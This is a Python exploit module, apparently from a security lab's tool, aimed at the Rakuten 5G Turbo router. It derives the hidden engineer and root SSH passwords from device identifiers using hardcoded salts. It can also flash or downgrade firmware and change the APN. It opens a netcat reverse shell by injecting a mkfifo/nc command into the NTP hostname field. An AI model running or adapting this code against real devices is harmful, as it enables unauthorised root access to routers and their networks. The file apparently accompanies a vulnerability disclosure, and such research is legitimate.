# turboApi.py
# @package   5GturboAPI
# @author    Samy Younsi - NeroTeam Security Labs <samy@neroteam.com>
# @license   Proprietary License - All Rights Reserved
# @docs      https://neroteam.com/blog/rakuten-5g-turbo-vulnerability

import argparse
from datetime import datetime
import time
import requests
import json
import os
from turboEncryption import (
    decrypt,
    encrypt,
    generateAppDeriveKey,
    hexHmacSha256,
    hexSha256,
)


"""
Get device information
"""
def getDeviceVersion(deviceInfo):
    dk = loadDK(deviceInfo)
    data = '[{"jsonrpc":"2.0","method":"GET","params":"scinfo.system","id":1},{"jsonrpc":"2.0","method":"GET","params":"modem_st.modem","id":2}]'
    response = execRequest(deviceInfo, dk, data)
    return response


"""
Generate Engineer Password
"""
def getEngineerPassword(deviceInfo):
    print("[INFO] Getting device IMEI and CSN...")
    response = json.loads(getDeviceVersion(deviceInfo))
    imei = response[1]["result"]["modem_st.modem"]["imei"]
    csn = response[0]["result"]["scinfo.system"]["serialnum"]
    print(f"[INFO] Device IMEI: {imei}")
    print(f"[INFO] Device CSN: {csn}")

    seed = deviceInfo.get("seed")
    defaultImei = "Werg@noamtms1u2M3.M"
    defaultCsn = "XePrJc&o4m1m3122R3.A"

    if not imei:
        imei = defaultImei
    if not csn:
        csn = defaultCsn
    if seed is None:
        seed = datetime.now().strftime("%Y%m%d")
        print(f"[INFO] SEED: {str(seed)}")

    engineerPwdString = f"{seed}{imei}SerU*I(comm#*.$%^&YRakuU*I(ten{csn}"
    engineerPwdHash = hexSha256(engineerPwdString)
    print("[INFO] Engineer Password:", engineerPwdHash)
    print("[INFO] Username: engineer | Password: {}".format(engineerPwdHash))
    return "[INFO] Note: If the password is not working, try rebooting your device."


"""
Generate SSH Password
"""
def getSshPassword(deviceInfo):
    print("[INFO] Getting device IMEI and CSN...")
    response = json.loads(getDeviceVersion(deviceInfo))
    imei = response[1]["result"]["modem_st.modem"]["imei"]
    csn = response[0]["result"]["scinfo.system"]["serialnum"]
    print(f"[INFO] Device IMEI: {imei}")
    print(f"[INFO] Device CSN: {csn}")

    seed = deviceInfo.get("seed")

    defaultImei = "Werg@noamtms1u2M3.M"
    defaultCsn = "XePrJc&o4m1m3122R3.A"

    if not imei:
        imei = defaultImei
    if not csn:
        csn = defaultCsn
    if seed is None:
        seed = datetime.now().strftime("%Y%m%d")
        print(f"[INFO] SEED: {str(seed)}")

    sshPwdString = f"{seed}{csn}Ser*.$%^&YU*I(comm#R(tenakuU*I{imei}"

    sshPwdHash = hexSha256(sshPwdString)
    print("[INFO] SSH Password:", sshPwdHash)
    print("[INFO] Username: root | Password: {}".format(sshPwdHash))
    return "[INFO] Note: If the password is not working, try rebooting your device."


"""
Set New APN
"""
def setDeviceApn(deviceInfo):
    if not deviceInfo["apn"]:
        raise ValueError("[ERROR] 'setDeviceApn': APN key is not defined in deviceInfo")
    dk = loadDK(deviceInfo)
    apn = deviceInfo["apn"]
    data = '[{{"jsonrpc":"2.0","method":"SET","params":{{"network.wan":{{"apn":"{}"}}}},"id":1}}, {{"jsonrpc":"2.0","method":"SET","params":{{"scaction.configuration":{{"softreset":"1"}}}},"id":2}}]'.format(
        apn
    )
    try:
        response = execRequest(deviceInfo, dk, data)
    except requests.exceptions.ConnectionError:
        pass

    print(
        "[INFO] The device APN has been updated to {}.\n[INFO] Please wait a few seconds for the device to restart...\n[INFO] Make sure the new SIM card has been inserted.".format(
            apn
        )
    )
    return


"""
Reboot Device
"""
def rebootDevice(deviceInfo):
    dk = loadDK(deviceInfo)
    data = '[{{"jsonrpc":"2.0","method":"SET","params":{{"scaction.configuration":{{"softreset":"1"}}}},"id":1}}]'
    try:
        response = execRequest(deviceInfo, dk, data)
    except requests.exceptions.ConnectionError:
        pass

    print("[INFO] The device is rebooting.")
    return


"""
Install/Downgrade firmware image
"""
def execInstallFw(device_info):
    if not device_info.get("fwImage"):
        raise ValueError(
            "[ERROR] 'execInstallFw': fwImage is not defined in deviceInfo"
        )

    print("[INFO] The device flash process has begun.")
    boundary = "-----------------------------27947939811533532427575922445"
    headers = {
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate",
        "Content-Type": f"multipart/form-data; boundary={boundary}",
    }

    with open(device_info.get("fwImage"), "rb") as f:
        firmware_content = f.read()

    multipart_data = (
        f"{boundary}\r\n"
        'Content-Disposition: form-data; name="FILE"; filename="firmware.ffw"\r\n'
        "Content-Type: application/octet-stream\r\n\r\n"
        f"{firmware_content.decode('latin1')}\r\n"
        f"{boundary}\r\n"
        'Content-Disposition: form-data; name="uploadType"\r\n\r\n'
        "image\r\n"
        f"{boundary}\r\n"
        'Content-Disposition: form-data; name="MAX_FILE_SIZE"\r\n\r\n'
        "135\r\n"
        f"{boundary}--\r\n"
    )

    print("[INFO] Uploading firmware to the device...")
    response = requests.post(
        "http://{}/upgrade.cgi".format(device_info["turboIp"]),
        headers=headers,
        data=multipart_data,
    )
    if response.status_code == 200 and response.text.strip() == "1":
        print(
            "[INFO] Device successfully flashed!\n[INFO] Please wait a few minutes for the device to complete the downgrade process and restart."
        )
        return 1
    else:
        print("[ERROR] Failed to upload firmware.")
        print(f"[ERROR] Status code: {response.status_code}")
        print(f"[ERROR] Response text: {response.text}")
        return 0


"""
Execute reverse shell on version 1.3.18 and under
"""
def execRevrsShell(deviceInfo):
    if not deviceInfo["host"] or not deviceInfo["port"]:
        raise ValueError(
            "[ERROR] 'execRevrsShell': Local host and port are not defined in deviceInfo"
        )

    dk = loadDK(deviceInfo)
    print("[INFO] Checking device version....")
    response = json.loads(getDeviceVersion(deviceInfo))
    fwversion = response[0]["result"]["scinfo.system"]["fwversion"]
    print(f"[INFO] Firmware version: {fwversion}")

    fwversion = int(fwversion.replace(".", ""))
    if fwversion > 1318:
        print(
            "[ERROR] Reverse shell is not compatible with firmware version above 1.3.18"
        )
        return

    LHOST = deviceInfo["host"]
    LPORT = deviceInfo["port"]
    data = '[{{"jsonrpc":"2.0","method":"SET","params":{{"ntpclient.@ntpclient":[{{"interval":"86400","count":"3","enabled":"1","index":"0"}}]}},"id":1}}, {{"jsonrpc":"2.0","method":"SET","params":{{"ntpclient.@ntpserver":[{{"hostname":"0.pool.ntp.org; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {} {} >/tmp/f","port":"123","index":"0"}},{{"port":"123","index":"1"}},{{"port":"123","index":"2"}},{{"port":"123","index":"3"}},{{"port":"123","index":"4"}}]}},"id":2}}, {{"jsonrpc":"2.0","method":"SET","params":{{"scaction.configuration":{{"softreset":"1"}}}},"id":3}}]'.format(
        LHOST, LPORT
    )

    try:
        response = execRequest(deviceInfo, dk, data)
    except requests.exceptions.ConnectionError:
        pass

    print(
        "[INFO] Reverse shell will start on {}:{}\n[INFO] Please wait a few seconds for the device to restart...\n[INFO] Make sure to listen `nc -lvnp {}` as the connection will be made during the boot process".format(
            LHOST, LPORT, LPORT
        )
    )

    return


"""
Login to 5G Turbo to get the dk
"""
def loginRequest(deviceInfo):
    hashPass = hexHmacSha256("$1$SERCOMM$", deviceInfo["turboPassword"])
    encryptionKey, salt = getSaltAndEncryptionKey(deviceInfo)
    hashPassEnc = hexHmacSha256(encryptionKey, hashPass)

    data = {
        "LoginName": deviceInfo["turboUsername"],
        "LoginPWD": hashPassEnc,
    }
    response = requests.post(
        "http://{}/data/login.json".format(deviceInfo["turboIp"]),
        data=data,
        verify=False,
    )
    response = response.content.decode("utf-8")

    if response == '"2"':
        print("[ERROR] A user is logged into the device.")
    elif response == '"3"' or response == '"4"':
        print("[ERROR] The password you entered was incorrect.")

    dk = generateAppDeriveKey(deviceInfo["turboPassword"], salt)
    return dk


def getSaltAndEncryptionKey(deviceInfo):
    timestamp = str(int(time.time() * 1000))
    response = requests.get(
        "http://{}/data/user_lang.json?_={}".format(deviceInfo["turboIp"], timestamp),
        verify=False,
    )
    data = json.loads(response.content)

    encryption_key = next(
        (item["encryption_key"] for item in data if "encryption_key" in item), None
    )
    salt = next((item["salt"] for item in data if "salt" in item), None)

    if not encryption_key or not salt:
        raise ValueError(
            "[ERROR] 'getSaltAndEncryptionKey': Encryption key or salt not found in the response, is device IP address correct?"
        )
    return encryption_key, salt


"""
Load Encryption / Decryption key
"""
def loadDK(deviceInfo):
    dk = loginRequest(deviceInfo)
    return dk


def execRequest(deviceInfo, dk, data):
    encData = encrypt(dk, data)
    timestamp = str(int(time.time() * 1000))

    url = "http://{}/data/data.cgi?_={}".format(deviceInfo["turboIp"], timestamp)
    response = requests.post(url, data=encData)

    if response.status_code == 200:
        try:
            decryptedData = decrypt(dk, json.dumps(response.json()))
            return decryptedData
        except ValueError:
            print("Failed to parse JSON response.")
    else:
        print(f"Request failed with status code: {response.status_code}")
